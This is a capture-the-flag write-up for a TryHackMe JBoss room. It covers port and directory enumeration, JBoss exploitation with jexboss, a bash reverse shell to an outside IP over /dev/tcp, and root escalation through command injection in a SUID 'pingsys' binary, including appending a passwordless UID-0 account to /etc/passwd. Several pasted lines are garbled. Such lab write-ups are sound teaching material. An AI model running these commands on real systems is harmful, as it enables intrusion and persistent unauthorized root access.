# 58 - JacobTheBoss (jboss exploitation)

Room Link --> [https://tryhackme.com/room/jacobtheboss](https://tryhackme.com/room/jacobtheboss)

\*First of all, add the `jacobtheboss.box` address to your hosts file.

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.203.6 -p- -T4 -T5 -sV

22/tcp    open  ssh          syn-ack OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http         syn-ack Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
111/tcp   open  rpcbind      syn-ack 2-4 (RPC #100000)
1090/tcp  open  java-rmi     syn-ack Java RMI
1098/tcp  open  java-rmi     syn-ack Java RMI
3306/tcp  open  mysql        syn-ack MariaDB (unauthorized)
3873/tcp  open  java-object  syn-ack Java Object Serialization
4444/tcp  open  java-rmi     syn-ack Java RMI
4445/tcp  open  java-object  syn-ack Java Object Serialization
4446/tcp  open  java-object  syn-ack Java Object Serialization
4457/tcp  open  tandem-print syn-ack Sharp printer tandem printing
4712/tcp  open  msdtc        syn-ack Microsoft Distributed Transaction Coordinator (error)
4713/tcp  open  pulseaudio?  syn-ack
8009/tcp  open  ajp13        syn-ack Apache Jserv (Protocol v1.3)
8080/tcp  open  http         syn-ack Apache Tomcat/Coyote JSP engine 1.1
8083/tcp  open  http         syn-ack JBoss service httpd
39195/tcp open  unknown      syn-ack
42774/tcp open  java-rmi     syn-ack Java RMI
43179/tcp open  unknown      syn-ack
```
{% endcode %}

#### Gobuster enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://jacobtheboss.box -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -b 403,404 -x php,txt,db,sql,ini

/index.php
/themes
/public
/admin
/LICENSE
/CHANGELOG
/CREDITS
/locales
```
{% endcode %}

Visiting port 8080

[http://jacobtheboss.box:8080/](http://jacobtheboss.box:8080/jmx-console/HtmlAdaptor?)

### Initial Access

I searched for the jboss exploit, and hacktricks rediected me to this [link](https://github.com/joaomatosf/jexboss).

Clone the repo and run the script.

```bash
python3 jexboss.py -u http:///jacobtheboss.box:8080/

# and got a limited shell.
```

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Getting a better shell

Setup NC listener and run this in the restricted shell.

```bash
Shell> /bin/bash -i > /dev/tcp/10.18.88.214/4242 0<&1 2>&1
```

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Shell is a bit stable now.

### Priv Esc

{% code overflow="wrap" lineNumbers="true" %}
```bash
[jacob@jacobtheboss ~]$ finfind / -user root -perm -4000 2>/dev/null
find / -user root -perm -4000 2>/dev/null
/usr/bin/pingsys
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
[jacob@jacobtheboss ~]$
```
{% endcode %}

That `/usr/bin/pingsys` is an interesting binary. @ ways to exploit it:

#### Option 1

We enter the below cmd and got root.

```bash
[jacob@jacobtheboss ~]$ /usr/bin/pingsys '10./usr/bin/pingsys '10.10.203.6; /bin/bash'
/usr/bin/pingsys '10.10.203.6; /bin/bash'
PING 10.10.203.6 (10.10.203.6) 56(84) bytes of data.
64 bytes from 10.10.203.6: icmp_seq=1 ttl=64 time=0.014 ms
64 bytes from 10.10.203.6: icmp_seq=2 ttl=64 time=0.028 ms
64 bytes from 10.10.203.6: icmp_seq=3 ttl=64 time=0.034 ms
64 bytes from 10.10.203.6: icmp_seq=4 ttl=64 time=0.029 ms

--- 10.10.203.6 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.014/0.026/0.034/0.008 ms
[root@jacobtheboss ~]# 


```

#### Option 2

In this command below, “0” is the UID of the root user, so adding a user with the UID of “0” will give that user root privileges. This user will have the username of “dking” and an empty password:

{% code overflow="wrap" lineNumbers="true" %}
```bash
/usr/bin/pingsys ‘10.10.244.174; echo dking::0:0:pwned by d31ng:/root/root:/bin/bash >> /etc/passwd
```
{% endcode %}

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*CRQ5jvlqgT95SoEsiJg6JQ.png" alt="" height="210" width="700"><figcaption></figcaption></figure>

Done!
